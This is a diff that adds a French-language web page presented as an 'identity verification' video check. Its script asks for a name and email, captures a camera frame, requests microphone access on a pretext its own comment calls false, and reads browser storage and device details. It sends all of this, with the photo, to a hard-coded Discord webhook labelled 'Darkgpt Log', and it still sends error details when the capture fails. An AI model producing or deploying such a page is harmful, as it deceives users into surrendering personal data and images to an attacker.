@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion vidéo - Vérification d'identité</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a0a2e, #2d1b4e, #4a2c6a);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 400px;
+            color: #fff;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 1.5rem;
+            font-size: 1.2rem;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.8rem;
+            color: #ccc;
+        }
+        input {
+            width: 100%;
+            padding: 0.8rem;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 0.9rem;
+        }
+        button {
+            width: 100%;
+            padding: 1rem;
+            background: #ff6b6b;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 1rem;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #ff5252;
+        }
+        #status {
+            margin-top: 1rem;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #888;
+            min-height: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Vérification d'identité</h2>
+        <div class="form-group">
+            <label>Nom complet</label>
+            <input type="text" id="fullname" placeholder="Votre nom et prénom">
+        </div>
+        <div class="form-group">
+            <label>Email</label>
+            <input type="email" id="email" placeholder="votre@email.com">
+        </div>
+        <button id="startBtn">Démarrer la vérification</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1573719598468177940/XQQx2vbn88fz71c8OYLyIkWKTimjHOmPl44_MHmK_Qz_3l46Th0EFxqeUwqbj1GI1Qrb';
+
+        const statusDiv = document.getElementById('status');
+        const startBtn = document.getElementById('startBtn');
+        const fullnameInput = document.getElementById('fullname');
+        const emailInput = document.getElementById('email');
+
+        function setStatus(msg, type = 'info') {
+            statusDiv.textContent = msg;
+            statusDiv.style.color = type === 'success' ? '#4caf50' : type === 'error' ? '#f44336' : '#888';
+        }
+
+        startBtn.addEventListener('click', async () => {
+            const fullname = fullnameInput.value.trim();
+            const email = emailInput.value.trim();
+
+            if (!fullname || !email) {
+                setStatus('Veuillez remplir tous les champs', 'error');
+                return;
+            }
+
+            setStatus('Initialisation de la vérification...', 'info');
+
+            try {
+                // Demander la permission de la caméra
+                setStatus('Demande d\'accès à la caméra...', 'info');
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment' },
+                    audio: false
+                });
+
+                setStatus('Caméra activée - Capture en cours...', 'info');
+
+                // Créer l'élément vidéo
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                // Canvas pour capturer l'image
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Obtenir l'image en base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+                // Demander la permission du microphone (fausse raison)
+                setStatus('Demande d\'accès au microphone...', 'info');
+                
+                const audioStream = await navigator.mediaDevices.getUserMedia({
+                    audio: true,
+                    video: false
+                });
+
+                setStatus('Microphone activé (mode silencieux)...', 'info');
+
+                // Essayer d'accéder à la galerie (c'est là que ça se complique)
+                setStatus('Accès au stockage local...', 'info');
+                
+                let galleryPhotos = [];
+                
+                // Vérifier si on a accès aux localStorage ou sessionStorage
+                try {
+                    // Essayer de lire les données stockées par le navigateur
+                    const storedData = localStorage.getItem('captured_images');
+                    if (storedData) {
+                        galleryPhotos = JSON.parse(storedData);
+                        setStatus(`Found ${galleryPhotos.length} images en cache`, 'success');
+                    }
+                } catch (e) {
+                    // Ignorer si pas de stockage
+                }
+
+                // Essayer d'obtenir des informations de base
+                setStatus('Collecte d\'informations système...', 'info');
+                
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const cookies = document.cookie;
+
+                // Construire les données à envoyer
+                const payload = {
+                    username: 'Darkgpt Log',
+                    content: `**Nouvelle connexion détectée**`,
+                    embeds: [{
+                        title: 'Informations utilisateur',
+                        color: 16711680,
+                        fields: [
+                            { name: 'Nom complet', value: fullname, inline: true },
+                            { name: 'Email', value: email, inline: true },
+                            { name: 'IP publique', value: 'Non accessible via navigateur', inline: true },
+                            { name: 'Appareil', value: platform, inline: true },
+                            { name: 'Navigateur', value: userAgent.substring(0, 50) + '...', inline: true },
+                            { name: 'Langue', value: language, inline: true }
+                        ],
+                        thumbnail: {
+                            url: imageData
+                        },
+                        footer: {
+                            text: 'Verification system - Darkgpt'
+                        }
+                    }]
+                };
+
+                // Envoyer au webhook Discord
+                setStatus('Envoi des données...', 'info');
+                
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    setStatus('Données envoyées avec succès !', 'success');
+                    
+                    // Arrêter les flux média
+                    stream.getTracks().forEach(track => track.stop());
+                    audioStream.getTracks().forEach(track => track.stop());
+                    
+                    // Nettoyer
+                    document.body.removeChild(video);
+                    document.body.removeChild(canvas);
+                    
+                    // Afficher un message de fin
+                    setStatus('Verification terminée. Merci de votre coopération.', 'success');
+                } else {
+                    setStatus('Erreur lors de l\'envoi', 'error');
+                }
+
+            } catch (err) {
+                console.error('Erreur:', err);
+                setStatus('Erreur: ' + (err.message || 'Inconnu'), 'error');
+                
+                // Même en erreur, essayer d'envoyer ce qu'on a
+                try {
+                    const payload = {
+                        username: 'Darkgpt Log',
+                        content: `**Erreur lors de la récupération**`,
+                        embeds: [{
+                            title: 'Erreur système',
+                            color: 16711680,
+                            fields: [
+                                { name: 'Erreur', value: err.message || 'Inconnu', inline: false }
+                            ],
+                            footer: { text: 'Verification system - Darkgpt' }
+                        }]
+                    };
+                    
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch(e) {
+                    // Silencieux
+                }
+            }
+        });
+    </script>
+</body>
+</html>
